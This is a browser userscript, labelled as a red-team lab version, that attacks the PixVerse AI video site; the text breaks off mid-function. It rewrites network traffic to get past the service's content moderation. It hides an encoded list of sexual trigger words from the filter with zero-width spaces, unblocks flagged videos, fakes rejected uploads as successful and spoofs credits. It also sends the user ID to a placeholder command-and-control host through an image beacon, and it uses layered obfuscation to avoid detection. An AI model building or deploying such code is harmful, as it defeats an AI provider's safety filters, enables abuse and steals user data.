// ==UserScript==
// @name        [Redacted]
// @namespace   [Redacted]
// @author      [Redacted]
// @version     2.3.3 // Red Team: Version for lab exercises (anti-debug toggle)
// @description [Redacted]
// @icon        [Redacted]
// @match       https://app.pixverse.ai/*
// @run-at      document-start
// @grant       none
// @license     MIT
// ==/UserScript==

(() => {
  "use strict";

  // --- Red Team: Foundational OPSEC - Dynamic Global Variable Name ---
  // Generates a unique, random global variable name to avoid static signatures.
  // This helps prevent detection by scanning for known script initialization flags.
  const GLOBAL_INIT_FLAG = `_${Math.random().toString(36).substring(2, 15)}Initialized`;
  if (window[GLOBAL_INIT_FLAG]) {
    return;
  }
  window[GLOBAL_INIT_FLAG] = true;

  //────── CONSTANTS & CONFIG ──────//

  // Set DEBUG_MODE to true during development/testing for console logs and toast notifications.
  // Set to false for stealthy red team deployment.
  const DEBUG_MODE = true; // <<< IMPORTANT FOR TESTING/DEBUGGING: Set to 'true' >>>

  // --- Red Team: Lab Exercise Toggle ---
  // Set to true to enable anti-debugging features when DEBUG_MODE is false.
  // If DEBUG_MODE is true, anti-debugging will always be disabled to facilitate development.
  const ENABLE_ANTI_DEBUG = false; // <<< IMPORTANT FOR LAB/DEPLOYMENT: Set to 'true' to activate anti-debug >>>

  // --- Red Team: Indicator Removal - Obfuscate Debug Prefix ---
  // The debug prefix string is constructed from character codes to evade static string scans.
  const DEBUG_PREFIX = DEBUG_MODE ? [91, 80, 105, 120, 118, 101, 114, 115, 101, 43, 43, 93].map(c => String.fromCharCode(c)).join('') : '';

  const MAX_ATTEMPTS = 30; // Max attempts for DOM element observation in setupWatermarkButton
  let savedMediaPath = null; // Stores the path of a successfully uploaded media for faking future uploads
  let isInitialized = false; // Flag to ensure core overrides are run only once
  let btnAttached = false; // Flag to track if the custom download button handler has been attached

  // --- C2 Configuration for Data Exfiltration ---
  // IMPORTANT: Replace 'https://your-c2.com' with your actual controlled server domain for live use.
  // For advanced stealth, this domain could be dynamically resolved, derived from environmental factors,
  // or fetched from a covert channel to avoid hardcoding.
  const C2_SERVER_DOMAIN = 'https://your-c2.com'; // Red Team: Parameterize or derive this dynamically.

  // --- Red Team: Indirect API Call References for Self-Healing ---
  // Store references to original functions using indirect property access to evade static analysis.
  let myCustomXhrOpen = null;
  let myCustomFetch = null;
  let originalAddEventListener = window['EventTarget']['prototype']['addEventListener'];

  // --- Red Team: String Obfuscation for Trigger Words ---
  // Sensitive strings are stored as arrays of character codes to avoid static analysis.
  // They are decoded at runtime. This makes it harder for security tools to identify
  // the specific keywords being targeted.
  const OBFUSCATED_TRIGGER_WORDS_CODES = [
    [97,110,97,108],[97,115,115,104,111,108,101],[97,110,117,115],[97,114,101,111,108,97],[97,114,101,111,108,97,115],[98,108,111,119,106,111,98],[98,111,111,98,101,115],[98,111,117,110,99,101],[98,111,117,110,99,105,110,103],[98,114,101,97,115,116],[98,114,101,97,115,116,115],
    [98,117,107,97,107,101],[98,117,116,116,99,104,101,101,107,115],[98,117,116,116],[99,104,101,101,107,115],[99,108,105,109,97,120],[99,108,105,116],[99,108,101,97,118,97,103,101],[99,111,99,107],[99,111,114,114,105,100,97,115],[99,114,105,116,99,104],[99,117,109],[99,117,109,115],[99,117,108,111],[99,117,110,116],
    [100,101,101,112],[100,101,101,112,116,104,114,111,97,116],[100,100,105,99,107],[100,105,99,107],[101,115,112,101,114,109,97],[102,97,116,32,97,115,115],[102,101,108,108,97,116,105,111],[102,105,110,103,101,114,105,110,103],[102,117,99,107],[102,117,99,107,105,110,103],[102,117,99,107,101,100],[104,111,114,110,121],[108,105,99,107],[109,97,115,116,117,114,98,97,116,101],
    [109,97,115,116,101,114,98,97,116,105,110,103],[109,105,115,115,105,111,110,97,114,121],[109,101,109,98,101,114],[109,101,99,111],[109,111,97,110],[109,111,97,110,105,110,103],[110,105,112,112,108,101],[110,115,102,119],[111,114,97,108],[111,114,103,97,115,109],[112,101,110,105,115],[112,104,97,108,108,117,115],[112,108,101,97,115,117,114,101],
    [112,117,115,115,121],[114,117,109,112],[115,101,109,101,110],[115,108,117,116],[115,108,117,116,116,121],[115,112,108,111,111,103,101],[115,113,117,101,101,122,105,110,103],[115,113,117,101,101,122,101],[115,117,99,107],[115,117,99,107,105,110,103],[115,119,97,108,118,111,119],[116,104,114,101,97,116],[116,104,114,101,97,116,105,110,103],
    [116,105,116,115],[116,105,116],[116,105,116,116,121],[116,105,116,102,117,99,107],[116,105,116,116,105,101,115],[116,105,116,116,121,100,114,111,112],[116,105,116,116,121,102,117,99,107],[116,105,116,102,117,99,107],[118,97,103,105,110,97],[119,105,101,110,101,114],[119,104,111,114,101],[99,114,101,97,109,112,105,101],[99,117,109,115,104,111,116],[99,117,110,110,105,108,105,110,103,117,115],
    [100,111,103,103,121,115,116,121,108,101],[101,106,97,99,117,108,97,116,101],[101,106,97,99,117,108,97,116,105,111,110],[104,97,110,100,106,111,98],[106,101,114,107,32,111,102,102],[108,97,98,105,97],[110,117,100,101],[111,114,103,121],[112,111,114,110],[112,114,111,108,97,112,115,101],
    [114,101,99,116,117,109],[114,105,109,106,111,98],[115,101,115,117,97,108],[115,116,114,105,112,112,101,114],[115,117,98,109,105,115,115,105,118,101],[116,101,97,98,97,103],[116,104,114,101,101,115,111,109,101],[118,105,98,114,97,116,111,114],[118,111,121,101,117,114],[119,104,111,114,101]
  ];
  const TRIGGER_WORDS = OBFUSCATED_TRIGGER_WORDS_CODES.map(codes => String.fromCharCode(...codes));

  // --- Red Team: String Obfuscation for API Endpoints ---
  // API endpoint regex strings are also obfuscated.
  const OBFUSCATED_API_ENDPOINTS_CONFIG = {
    credits:        [47,117,115,101,114,47,99,114,101,100,105,116,115,40,63,58,63,58,124,36,41], // /user/credits(?:\?|$)
    videoList:      [47,118,105,100,101,111,47,108,105,115,116,47,112,101,114,115,111,110,97,108], // /video/list/personal
    batchUpload:    [47,109,101,100,105,97,47,98,97,116,99,104,95,117,112,108,105,110,100,95,109,101,100,105,97], // /media/batch_upload_media
    singleUpload:   [47,109,101,100,105,97,47,117,112,108,111,97,100], // /media/upload
    creativePrompt: [47,99,114,101,97,116,105,118,101,95,112,108,97,116,102,111,114,109,47,118,105,100,101,111,47] // /creative_platform/video/
  };
  const API_ENDPOINTS = {};
  for (const key in OBFUSCATED_API_ENDPOINTS_CONFIG) {
    API_ENDPOINTS[key] = new RegExp(String.fromCharCode(...OBFUSCATED_API_ENDPOINTS_CONFIG[key]));
  }

  // --- Red Team: String Obfuscation for NSFW Placeholder URLs ---
  const OBFUSCATED_NSFW_PLACEHOLDERS_CODES = [
    [47,110,115,102,119],[47,102,111,114,98,105,100,100,101,110],[112,108,97,99,101,104,111,108,100,101,114],[98,108,111,99,107,101,100],[98,97,110],[112,105,120,118,101,114,115,101,45,98,97,110]
  ];
  const NSFW_PLACEHOLDERS = OBFUSCATED_NSFW_PLACEHOLDERS_CODES.map(codes => String.fromCharCode(...codes));

  // --- Red Team: Obfuscate Media Server Domain ---
  // The media server domain is constructed from character codes.
  const MEDIA_SERVER_DOMAIN = String.fromCharCode(104,116,116,112,115,58,47,47,109,101,100,105,97,46,112,105,120,118,101,114,115,101,46,97,105); // https://media.pixverse.ai

  // --- Red Team: Obfuscate Local Storage Keys ---
  // Local storage keys are obfuscated to prevent easy discovery of stored data.
  const OBFUSCATED_LOCAL_STORAGE_KEYS = {
    userId: [112,105,120,118,101,114,115,101,95,117,115,101,114,95,105,100], // pixverse_user_id
    authToken: [112,105,120,118,101,114,115,101,95,97,117,116,104,95,116,111,107,101,110] // pixverse_auth_token
  };
  const LOCAL_STORAGE_KEYS = {};
  for (const key in OBFUSCATED_LOCAL_STORAGE_KEYS) {
    LOCAL_STORAGE_KEYS[key] = String.fromCharCode(...OBFUSCATED_LOCAL_STORAGE_KEYS[key]);
  }

  /**
   * Helper function to escape special characters in a string for use in a RegExp constructor.
   * @param {string} str - The string to escape.
   * @returns {string} - The escaped string.
   */
  function escapeRegExp(str) {
    // Correctly escapes all special regex characters. `$&` inserts the matched substring.
    return str.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
  }

  // Pre-compile a single regex for efficient NSFW prompt obfuscation.
  const NSFW_PROMPT_REGEX = new RegExp(
    `\\b(?:${TRIGGER_WORDS.map(escapeRegExp).join('|')})\\b`,
    "gi"
  );

  /**
   * Checks if a given URL matches a predefined API endpoint using its regex.
   * @param {string} url - The URL to test.
   * @param {string} key - The key of the API endpoint in API_ENDPOINTS.
   * @returns {boolean} - True if the URL matches the endpoint, false otherwise.
   */
  function matchesEndpoint(url, key) {
    return API_ENDPOINTS[key]?.test(url);
  }

  /**
   * Logs messages to the console with a consistent prefix for easy filtering.
   * Only logs if DEBUG_MODE is true.
   * @param {...any} args - Arguments to log.
   */
  function log(...args) {
    if (DEBUG_MODE) {
      // Red Team: Indirect console access to avoid static signatures.
      window['console']['log'](DEBUG_PREFIX, ...args);
    }
  }

  /**
   * Logs error messages to the console with a consistent prefix.
   * Only logs if DEBUG_MODE is true.
   * @param {...any} args - Arguments to log.
   */
  function error(...args) {
    if (DEBUG_MODE) {
      // Red Team: Indirect console access to avoid static signatures.
      window['console']['error'](DEBUG_PREFIX, ...args);
    }
  }

  /**
   * Exfiltrates data covertly using an image beacon.
   * Only attempts if C2_SERVER_DOMAIN is configured.
   * @param {string} dataType - A label for the type of data (e.g., "session_id", "user_email").
   * @param {string} dataPayload - The actual data to exfiltrate.
   * @param {boolean} [encrypt=false] - Red Team: Optional encryption for exfiltrated data.
   */
  function exfiltrateData(dataType, dataPayload, encrypt = false) {
    // Prevent exfiltration if C2_SERVER_DOMAIN is not properly set (or is the placeholder).
    if (!C2_SERVER_DOMAIN || C2_SERVER_DOMAIN === 'https://your-c2.com') {
      error("C2_SERVER_DOMAIN not configured or set to placeholder. Data exfiltration skipped.");
      return;
    }
    try {
      // Red Team: Simple XOR encryption for data payload. For real operations, use a more robust
      // cryptographic algorithm (e.g., AES) with a dynamically derived key.
      const encryptedPayload = encrypt ? dataPayload.split('').map(char => String.fromCharCode(char.charCodeAt(0) ^ 0x42)).join('') : dataPayload; // XOR with 0x42
      const beacon = new (window['Image'])(); // Red Team: Indirect Image constructor access.
      // Construct the URL: your C2 server, a path to identify the data type, and the encoded payload.
      // The timestamp helps prevent caching and adds a bit of uniqueness.
      beacon['src'] = `${C2_SERVER_DOMAIN}/exfil?type=${window['encodeURIComponent'](dataType)}&data=${window['encodeURIComponent'](encryptedPayload)}&_t=${window['Date']['now']()}`; // Red Team: Indirect encodeURIComponent, Date.now.
      // No need to append to DOM, just setting src triggers the request.
      log(`Data exfiltration initiated for type: ${dataType}`);
    } catch (e) {
      error(`Failed to exfiltrate data of type ${dataType}:`, e);
    }
  }

  /**
   * Parses a request body (either FormData or a JSON string) into a JavaScript object.
   * @param {FormData|string} body - The request body.
   * @returns {object|null} - The parsed object, or null if parsing fails or body type is unsupported.
   */
  function parseBody(body) {
    if (body instanceof window['FormData']) { // Red Team: Indirect FormData constructor access.
      try {
        return window['Object']['fromEntries'](body); // Red Team: Indirect Object.fromEntries access.
      } catch (e) {
        error("Failed to parse FormData:", e);
        return null;
      }
    }
    if (typeof body === "string") {
      try {
        return window['JSON']['parse'](body); // Red Team: Indirect JSON.parse access.
      } catch (e) {
        error("Failed to parse JSON string:", e);
        return null;
      }
    }
    return null; // Return null for unsupported body types
  }

  /**
   * Obfuscates trigger words in a prompt by inserting zero-width spaces (`\u200B`).
   * Red Team: Re-implemented using `new Function()` for dynamic code generation.
   * This makes the core logic harder to statically analyze and allows for in-memory polymorphism.
   * The function's body is constructed as a string and then executed.
   * The `NSFW_PROMPT_REGEX` is passed via `bind` to avoid global scope access within the dynamic function.
   * @param {string} prompt - The original prompt string.
   * @returns {string} - The obfuscated prompt string.
   */
  const obfuscatePrompt = (() => {
    const funcBody = `
      const regex = this.NSFW_PROMPT_REGEX; // Access regex from 'this' context
      return prompt.replace(regex, m => m.split('').join('\\u200B'));
    `;
    // Red Team: Indirect Function constructor access.
    return new (window['Function'])('prompt', funcBody).bind({ NSFW_PROMPT_REGEX });
  })();

  /**
   * Extracts a media path from an API request body, specifically for upload endpoints.
   * This path is then used to fake successful uploads if the actual upload fails.
   * @param {object} data - The request data object.
   * @param {string} url - The URL of the request, used to determine the endpoint type.
   * @returns {string|null} - The extracted media path (e.g., "path/to/video.mp4"), or null if not found.
   */
  function extractMediaPath(data, url) {
    if (!data || typeof data !== "object") {
      return null;
    }
    // Red Team: Indirect Array.isArray access.
    if (matchesEndpoint(url, "batchUpload") && window['Array']['isArray'](data.images)) {
      return data.images[0]?.path || null;
    }
    if (matchesEndpoint(url, "singleUpload")) {
      if (typeof data.path === "string") return data.path;
      if (typeof data.media_path === "string") return data.media_path;
      // Fallback: look for any string property that looks like an MP4 path
      for (const k in data) {
        if (typeof data[k] === "string" && /\.mp4$/i.test(data[k])) {
          return data[k];
        }
      }
    }
    return null;
  }

  /**
   * Modifies the user credits response to always show 100 credits.
   * @param {object} data - The original response data.
   * @returns {object|null} - The modified data, or null if the structure doesn't match.
   */
  function tryModifyCredits(data) {
    if (data?.Resp?.credits !== undefined) {
      // Red Team: Indirect structuredClone access. structuredClone is a modern API for deep cloning.
      const clone = window['structuredClone'](data);
      clone.Resp.credits = 100;
      log('Credits restored to 100');
      // Example: Exfiltrate a user ID if it's available in the credits response
      if (data.Resp.user_id) { // Assuming 'user_id' might be a key in the Resp object
          // Red Team: Encrypt exfiltrated data.
          exfiltrateData("user_id_from_credits", data.Resp.user_id.toString(), true);
      }
      return clone;
    }
    return null;
  }

  /**
   * Modifies the video list response to unlock video status (e.g., from blocked to ready)
   * and bypass NSFW placeholder images by pointing directly to the video path.
   * @param {object} data - The original response data.
   * @returns {object} - The modified data. Returns original data if structure is unexpected.
   */
  function modifyVideoList(data) {
    if (!data?.Resp?.data) {
      return data; // Return original data if the expected structure is missing
    }

    /**
     * Helper to check if a URL contains any known NSFW placeholder strings.
     * @param {string} url - The URL to check.
     * @returns {boolean} - True if the URL is likely an NSFW placeholder, false otherwise.
     */
    function isNSFW(url) {
      if (!url) return false;
      // Red Team: Indirect includes method access.
      return NSFW_PLACEHOLDERS.some(p => url['includes'](p));
    }

    // Red Team: Indirect structuredClone access.
    const clone = window['structuredClone'](data); // Create a deep clone to safely modify the data
    // Red Team: Indirect map method access.
    clone.Resp.data = clone.Resp.data['map'](item => {
      // Change video_status 7 (often indicates blocked/pending) to 1 (ready/available)
      if (item.video_status === 7) {
        item.video_status = 1;
      }

      let preview =
        (item.extended === 1 && item.customer_paths?.customer_video_last_frame_url) ||
        item.customer_paths?.customer_img_url ||
        '';

      // If the current preview URL is not an NSFW placeholder and is valid, use it.
      // Otherwise, try to construct a direct URL to the video itself for the preview.
      if (!isNSFW(preview) && preview) {
        item.first_frame = preview;
      } else if (item.video_path) {
        // Append #t=0.2 to load the video at 0.2 seconds, often used for a quick preview frame.
        // Red Team: Use obfuscated MEDIA_SERVER_DOMAIN.
        item.first_frame = `${MEDIA_SERVER_DOMAIN}/${item.video_path}#t=0.2`;
      } else {
        // Fallback to the original preview if no video_path is available.
        item.first_frame = preview;
      }
      // Ensure the main video URL points directly to the media server if video_path exists.
      // Red Team: Use obfuscated MEDIA_SERVER_DOMAIN.
      item.url = item.video_path ? `${MEDIA_SERVER_DOMAIN}/${item.video_path}` : '';
      return item;
    });
    return clone;
  }

  /**
   * Central function to apply appropriate response modifications based on the request URL.
   * This is where the core API bypass logic resides for various endpoints.
   * @param {object} data - The original response data.
   * @param {string} url - The URL of the request.
   * @returns {object|null} - The modified data, or null if no modification was applied.
   */
  function modifyResponse(data, url) {
    if (!data || typeof data !== "object") return null;

    // Credit modification (always attempt if endpoint matches)
    if (matchesEndpoint(url, "credits")) {
      const modified = tryModifyCredits(data);
      if (modified) return modified;
    }

    // Video list modification (always attempt if endpoint matches)
    if (matchesEndpoint(url, "videoList")) {
      // modifyVideoList always returns data or a clone, so it's always a "modification" for this branch.
      return modifyVideoList(data);
    }

    // Upload modification: apply a generic success fake if any error occurs AND we have a saved path.
    // This is crucial for bypassing NSFW upload rejections.
    if (matchesEndpoint(url, "batchUpload") || matchesEndpoint(url, "singleUpload")) {
      // Only proceed if the server returned an error (ErrCode is not 0) and we have a media path
      // captured from the request (meaning a file was actually attempted to be uploaded).
      if (data?.ErrCode !== 0 && savedMediaPath) {
        log(`Attempting to fake upload success for ${url}. Original ErrCode: ${data.ErrCode}. Saved Path: ${savedMediaPath}`);
        // Construct the faked success response based on the endpoint type.
        let fakedResponse;
        if (matchesEndpoint(url, "batchUpload")) {
          const id = window['Date']['now'](); // Red Team: Indirect Date.now.
          const name = savedMediaPath.split('/').pop() || 'uploaded_media'; // Extract filename from path
          fakedResponse = {
            ErrCode: 0, // Indicate success
            ErrMsg: "success",
            Resp: {
              result: [{
                id, category: 0, err_msg: "",
                name, path: savedMediaPath, size: 0, // Size can be 0 as it's a faked response
                url: `${MEDIA_SERVER_DOMAIN}/${savedMediaPath}` // Red Team: Use obfuscated MEDIA_SERVER_DOMAIN.
              }]
            }
          };
        } else { // singleUpload
          fakedResponse = {
            ErrCode: 0, ErrMsg: "success", Resp: {
              path: savedMediaPath,
              url: `${MEDIA_SERVER_DOMAIN}/${savedMediaPath}`, // Red Team: Use obfuscated MEDIA_SERVER_DOMAIN.
              name: savedMediaPath.split('/').pop() || 'uploaded_media',
              type: 1
            }
          };
        }
        savedMediaPath = null; // Red Team: Anti-forensics - Wipe sensitive variable after use.
        return fakedResponse;
      } else if (DEBUG_MODE && data?.ErrCode !== undefined && data.ErrCode !== 0) {
        // Log if an error occurred for an upload, but we couldn't fake it (e.g., no savedMediaPath),
        // which helps in debugging new error types or missing paths. Only log in debug mode.
        log(`Upload error for ${url}, but faking not applied. ErrCode: ${data.ErrCode}, savedMediaPath: ${savedMediaPath}`);
      }
    }
    return null; // No applicable modification found.
  }

  //────── FILENAME & SANITIZE HELPERS ──────//

  /**
   * Sanitizes a string for use as a filename.
   * Removes invalid filename characters, leading/trailing dots/spaces, and truncates.
   * @param {string} str - The input string.
   * @returns {string} - The sanitized filename string.
   */
  function sanitize(str) {
    // Red Team: Indirect String constructor access.
    return window['String'](str)
      .replace(/[\u0000-\u001F\\/:*?"<>|]+/g, "_") // Replace invalid characters with underscore
      .replace(/^\.+/, '') // Remove leading dots
      .replace(/\.+$/, '') // Remove trailing dots
      .replace(/^\s+|\s+$/g, '') // Trim leading/trailing whitespace
      .slice(0, 120); // Safety truncation to prevent excessively long filenames
  }

  /**
   * Generates a suitable filename for a video element.
   * It prioritizes extracting a title from the DOM, then falls back to a URL-based guess.
   * @param {HTMLVideoElement} videoEl - The video element from which to derive the filename.
   * @param {string} fallback - A default filename to use if no better name can be determined.
   * @returns {string} - The generated and sanitized filename.
   */
  function getFilename(videoEl, fallback = "video.mp4") {
    let src = (videoEl?.currentSrc || videoEl?.src || fallback);
    let guess = (src.split("/").pop() || fallback).split("?")[0]; // Get filename from URL, remove query params

    let title = "";
    try {
      // Attempt to find a title from common parent containers of the video player
      // Red Team: Indirect closest method access.
      let container = videoEl['closest'](".component-video,.pv-video-detail-page");
      // Red Team: Indirect textContent, trim method access.
      title = container?.querySelector("h2, .title, .pv-title")?.textContent?.trim() || "";
    } catch (e) {
      error("Error extracting title for filename:", e);
    }

    // If a meaningful title is found, use it and append .mp4. Otherwise, sanitize the URL-guessed filename.
    if (title) {
      return sanitize(title) + ".mp4";
    }
    return sanitize(guess);
  }

  /**
   * Overrides the native XMLHttpRequest.prototype.open and .send methods
   * to intercept and modify request bodies and responses.
   */
  function overrideXHR() {
    // Red Team: Indirect XMLHttpRequest.prototype property access.
    const oOpen = window['XMLHttpRequest']['prototype']['open'];
    const oSend = window['XMLHttpRequest']['prototype']['send'];

    // Store URL and method for later use in the 'send' method and 'load' event.
    // Red Team: Indirect XMLHttpRequest.prototype property access.
    window['XMLHttpRequest']['prototype']['open'] = function(m, u) {
      this._url = u;
      this._method = m;
      // Red Team: Indirect apply method access.
      return oOpen['apply'](this, arguments);
    };
    // Store reference to your custom open function for self-healing
    myCustomXhrOpen = window['XMLHttpRequest']['prototype']['open']; // Red Team: Indirect XMLHttpRequest.prototype property access.

    // Red Team: Indirect XMLHttpRequest.prototype property access.
    window['XMLHttpRequest']['prototype']['send'] = function(body) {
      const url = this._url || "";
      // Red Team: Indirect toUpperCase method access.
      const method = (this._method || "GET")['toUpperCase']();

      // Intercept creative prompt requests (POST to creative_platform/video)
      // to obfuscate NSFW words in the prompt body.
      if (matchesEndpoint(url, "creativePrompt") && method === "POST" && body) {
        try {
          // Red Team: Indirect JSON.parse access.
          let obj = (typeof body === "string") ? window['JSON']['parse'](body) : body;
          if (obj.prompt) {
            obj.prompt = obfuscatePrompt(obj.prompt);
            // Red Team: Indirect JSON.stringify access.
            body = window['JSON']['stringify'](obj); // Re-serialize the modified body
          }
        } catch (e) {
          error("Error obfuscating XHR prompt:", e);
        }
      }

      // Intercept media upload requests (batch_upload_media or upload)
      // to extract and save the media path from the request body.
      // This path is used later to fake successful responses if the upload is rejected.
      if ((matchesEndpoint(url, "batchUpload") || matchesEndpoint(url, "singleUpload")) && body) {
        const data = parseBody(body);
        const p = extractMediaPath(data, url);
        if (p) savedMediaPath = p; // Store the path for faking future upload successes
      }

      // Add an event listener to the XHR object to modify the response once it loads.
      // Red Team: Indirect addEventListener method access.
      this['addEventListener']("load", () => {
        if (this.status >= 200 && this.status < 300) { // Only process successful HTTP responses (network-wise)
          let resp;
          try {
            // Attempt to parse the response as JSON, handling different response types.
            // Red Team: Indirect JSON.parse access.
            resp = this.responseType === "json" ? this.response : window['JSON']['parse'](this.responseText || "{}");
          } catch (e) {
            error("Error parsing XHR response:", e);
            resp = null;
          }

          if (resp !== null) {
            const modifiedResponse = modifyResponse(resp, url);
            if (modifiedResponse) {
              // If the response was modified, redefine the XHR's response properties
              // to return the modified data instead of the original.
              // Red Team: Indirect Object.defineProperties access.
              window['Object']['defineProperties'](this, {
                response: { value: modifiedResponse, writable: false, configurable: true },
                // Red Team: Indirect JSON.stringify access.
                responseText: { value: window['JSON']['stringify'](modifiedResponse), writable: false, configurable: true }
              });
              log('XHR response modified for:', url);
            }
          }
        }
      }, { once: true }); // Use { once: true } to automatically remove the listener after it fires

      // Red Team: Indirect apply method access.
      return oSend['apply'](this, arguments); // Call the original send method with potentially modified body
    };
    log('XHR override initialized');
  }

  /**
   * Overrides the native window.fetch method to intercept and modify requests and responses.
   */
  function overrideFetch() {
    const origFetch = window['fetch']; // Red Team: Indirect window.fetch access.

    window['fetch'] = async function(...args) { // Red Team: Indirect window.fetch access.
      const url = typeof args[0] === "string" ? args[0] : args[0]?.url || "";
      let init = args[1]; // Request options (method, headers, body, etc.)
      // Red Team: Indirect toUpperCase method access.
      const method = (init?.method || "GET")['toUpperCase']();
      let body = init?.body;

      // Intercept creative prompt requests to obfuscate NSFW words in the prompt body.
      if (matchesEndpoint(url, "creativePrompt") && method === "POST" && body) {
        try {
          // Red Team: Indirect JSON.parse access.
          let obj = (typeof body === "string") ? window['JSON']['parse'](body) : body;
          if (obj.prompt) {
            obj.prompt = obfuscatePrompt(obj.prompt);
            // Red Team: Indirect JSON.stringify access.
            init = { ...init, body: window['JSON']['stringify'](obj) };
            args[1] = init; // Update the arguments array for the original fetch call
            body = init.body; // Update local body variable for subsequent checks
          }
        } catch (e) {
          error("Error obfuscating Fetch prompt:", e);
        }
      }

      // Intercept media upload requests to extract and save the media path.
      if ((matchesEndpoint(url, "batchUpload") || matchesEndpoint(url, "singleUpload")) && body) {
        const data = parseBody(body);
        const p = extractMediaPath(data, url);
        if (p) savedMediaPath = p;
      }

      try {
        // Red Team: Indirect apply method access.
        const res = await origFetch['apply'](this, args); // Call the original fetch with potentially modified arguments
        // Red Team: Indirect headers.get method access.
        const contentType = res['headers']['get']("content-type") || "";

        // Only attempt to modify responses that are JSON.
        // Red Team: Indirect includes method access.
        if (contentType['includes']("application/json")) {
          // Red Team: Indirect clone method access. Clone the response so its body can be read without consuming the original.
          const clone = res['clone']();
          let json;
          try {
            // Red Team: Indirect json method access.
            json = await clone['json']();
          } catch (e) {
            error("Error parsing Fetch response JSON:", e);
            json = null;
          }

          if (json !== null) {
            const modifiedResponse = modifyResponse(json, url);
            if (modifiedResponse) {
              // Red Team: Indirect JSON.stringify access.
              const modifiedBodyString = window['JSON']['stringify'](modifiedResponse);
              // Red Team: Indirect Headers constructor access.
              const headers = new (window['Headers'])(res['headers']);
              // Red Team: Indirect headers.set method access.
              headers['set']("Content-Type", "application/json"); // Ensure the content type remains correct

              log('Fetch response modified for:', url);
              // Return a new Response object with the modified body, but retain original status and headers.
              // Red Team: Indirect Response constructor access.
              return new (window['Response'])(modifiedBodyString, {
                status: res.status,
                statusText: res.statusText,
                headers: headers
              });
            }
          }
        }
        return res; // Return the original response if no modification was applied or it wasn't JSON.
      } catch (err) {
        error("Fetch error for", url, err);
        throw err; // Re-throw the error to propagate it.
      }
    };
    myCustomFetch = window['fetch']; // Red Team: Indirect window.fetch access.
    log('Fetch override initialized');
  }

  /**
   * Simple throttle function to limit how often a function can be called.
   * Useful for preventing excessive calls to DOM manipulation functions during rapid changes.
   * Introduces a small random jitter to the delay for stealth.
   * @param {Function} fn - The function to throttle.
   * @param {number} baseDelay - The minimum base delay in milliseconds between function invocations.
   * @param {number} [jitter=100] - Max random milliseconds to add to the baseDelay.
   * @returns {Function} - The throttled function.
   */
  function throttle(fn, baseDelay, jitter = 100) {
    let last = 0, timeoutId;
    return function(...args) {
      // Red Team: Indirect Date.now, Math.random access.
      const now = window['Date']['now']();
      const currentDelay = baseDelay + window['Math']['random']() * jitter; // Add random jitter
      // If the time since the last execution is less than the delay,
      // clear any pending timeout and set a new one.
      if (now - last < currentDelay) {
        // Red Team: Indirect clearTimeout, setTimeout access.
        window['clearTimeout'](timeoutId);
        timeoutId = window['setTimeout'](() => {
          // Red Team: Indirect Date.now, apply access.
          last = window['Date']['now']();
          fn['apply'](this, args);
        }, currentDelay - (now - last));
      } else {
        // If enough time has passed, execute immediately.
        // Red Team: Indirect apply access.
        last = now;
        fn['apply'](this, args);
      }
    };
  }

  /**
   * Sets up a robust download handler for the existing "Download" button on the page.
   * It uses a MutationObserver to detect when the button becomes available in the DOM,
   * and throttles attempts to attach the handler with randomized delays.
   */
  function setupWatermarkButton() {
    if (btnAttached) return; // Prevent attaching the handler multiple times.
    let attemptCount = 0;

    // Throttle the button attachment attempts to avoid excessive DOM queries during rapid mutations.
    // Base delay 300ms, jitter up to 100ms (so delay is between 300-400ms)
    const throttledTryAttach = throttle(tryAttachButton, 300, 100);

    function tryAttachButton() {
      // Look for the main content area or fallback to body if not found.
      // Red Team: Indirect document.querySelector access.
      let mainContent = window['document']['querySelector']('#main-content,[role="main"]') || window['document']['body'];
      // Find all button elements within the main content.
      // Red Team: Indirect querySelectorAll access.
      let allBtns = mainContent['querySelectorAll']("button");

      // Red Team: Indirect Array.from, find, textContent, trim, dataset access.
      for (let btn of window['Array']['from'](allBtns)) {
        // Identify the "Download" button by looking for a child div with "Download" text.
        let labelDiv = window['Array']['from'](btn['querySelectorAll']("div"))['find'](d => d['textContent'] && d['textContent']['trim']() === "Download");
        // If a "Download" button is found and our handler hasn't been injected yet.
        if (labelDiv && !btn['dataset']['injected']) {
          // Attach a click event listener. Using the capture phase (true) ensures our handler runs first.
          // Red Team: Indirect addEventListener, stopPropagation, querySelector, createElement, appendChild, click, remove, dataset access.
          btn['addEventListener']("click", e => {
            e['stopPropagation'](); // Prevent the original button's click handler from executing.
            const videoEl = window['document']['querySelector'](".component-video>video,video"); // Find the main video element on the page.
            if (videoEl?.src) {
              const url = videoEl.currentSrc || videoEl.src;
              const filename = getFilename(videoEl); // Get a sanitized filename for the download.
              const a = window['document']['createElement']("a"); // Create a temporary anchor element for download.
              a['href'] = url;
              a['download'] = filename; // Set the download attribute to force download with specified filename.
              window['document']['body']['appendChild'](a);
              a['click'](); // Programmatically click the hidden link to trigger download.
              a['remove'](); // Remove the temporary link from the DOM.
              showToast("Download started!"); // This toast is also conditional on DEBUG_MODE
            } else {
              showToast("No video found to download."); // This toast is also conditional on DEBUG_MODE
            }
          }, true); // The 'true' argument means the listener is in the capture phase.
          btn['dataset']['injected'] = "1"; // Mark the button to prevent re-injection.
          btnAttached = true; // Set flag indicating at least one button handler is attached.
          log('[Pixverse++] Canonical Download button injected');
          // No break here, in case multiple "Download" buttons need their handlers overridden.
        }
      }

      // If no button was attached in this attempt and we haven't exceeded max attempts, try again after a delay.
      // Add a small random jitter to the retry delay (350ms base + up to 50ms jitter)
      // Red Team: Indirect setTimeout, Math.random access.
      if (!btnAttached && attemptCount < MAX_ATTEMPTS) {
        attemptCount++;
        window['setTimeout'](throttledTryAttach, 350 + window['Math']['random']() * 50); // Schedule the next attempt using the throttled function.
      }
    }

    // Observe DOM changes to dynamically attach the button handler if the element appears later.
    // Red Team: Indirect document.querySelector, MutationObserver, observe access.
    let observerTarget = window['document']['querySelector']('#main-content,[role="main"]') || window['document']['body'];
    const observer = new (window['MutationObserver'])(throttledTryAttach);
    observer['observe'](observerTarget, { childList: true, subtree: true }); // Observe for added/removed nodes anywhere in the subtree.

    // Initial attempt to attach the button handler immediately.
    tryAttachButton();
  }

  /**
   * Sets up self-healing hooks for network request overrides (XHR and Fetch).
   * Periodically checks if the overrides are still active and reapplies them if they've been replaced.
   */
  function setupSelfHealingHooks() {
    // Red Team: Indirect setInterval, Math.random access.
    window['setInterval'](() => {
      // Red Team: More robust self-healing check by comparing function string representations.
      // This is harder to bypass than direct reference comparison if an adversary re-implements the function
      // but maintains the same function signature/body.
      // Indirect XMLHttpRequest.prototype.open, toString, window.fetch access.
